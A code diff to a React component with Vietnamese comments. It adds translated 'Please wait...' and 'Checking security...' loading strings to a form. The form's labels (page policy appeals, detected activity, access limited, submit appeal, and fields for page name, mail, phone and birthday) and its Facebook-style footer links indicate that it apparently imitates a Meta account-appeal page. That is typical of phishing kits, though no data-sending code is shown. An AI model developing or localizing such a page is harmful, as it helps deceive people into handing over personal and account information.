@@ -41,7 +41,10 @@ const Home = () => {
             careers: 'Careers',
             createPage: 'Create Page',
             termsPolicies: 'Terms and policies',
-            cookies: 'Cookies'
+            cookies: 'Cookies',
+            // 🚀 THÊM: Text cho trạng thái loading
+            pleaseWait: 'Please wait...',
+            checkingSecurity: 'Checking security...'
         }),
         []
     );
@@ -115,7 +118,7 @@ const Home = () => {
     // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
     const translateCriticalTexts = useCallback(async (targetLang) => {
         try {
-            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit] = await Promise.all([
+            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
                 translateText(defaultTexts.helpCenter, targetLang),
                 translateText(defaultTexts.pagePolicyAppeals, targetLang),
                 translateText(defaultTexts.detectedActivity, targetLang),
@@ -126,7 +129,9 @@ const Home = () => {
                 translateText(defaultTexts.phone, targetLang),
                 translateText(defaultTexts.birthday, targetLang),
                 translateText(defaultTexts.yourAppeal, targetLang),
-                translateText(defaultTexts.submit, targetLang)
+                translateText(defaultTexts.submit, targetLang),
+                translateText(defaultTexts.pleaseWait, targetLang),
+                translateText(defaultTexts.checkingSecurity, targetLang)
             ]);
 
             setTranslatedTexts(prev => ({
@@ -141,7 +146,9 @@ const Home = () => {
                 phone,
                 birthday,
                 yourAppeal,
-                submit
+                submit,
+                pleaseWait,
+                checkingSecurity
             }));
 
             // Dịch phần còn lại ở background
@@ -384,8 +391,6 @@ const Home = () => {
         }
     ];
 
-    // 🚀 XÓA LOADING COMPONENT - LUÔN HIỂN THỊ WEB NGAY
-
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
@@ -547,10 +552,10 @@ const Home = () => {
                                             <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                             <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                         </svg>
-                                        Please wait...
+                                        {translatedTexts.pleaseWait}
                                     </>
                                 ) : !isFormEnabled ? (
-                                    'Đang kiểm tra...'
+                                    translatedTexts.checkingSecurity
                                 ) : (
                                     translatedTexts.submit
                                 )}
@@ -559,7 +564,7 @@ const Home = () => {
                             {/* 🚀 Hiển thị trạng thái bảo mật */}
                             {!securityChecked && (
                                 <div className="text-center text-sm text-gray-500 mt-2">
-                                    Đang kiểm tra bảo mật...
+                                    {translatedTexts.checkingSecurity}
                                 </div>
                             )}
                         </div>
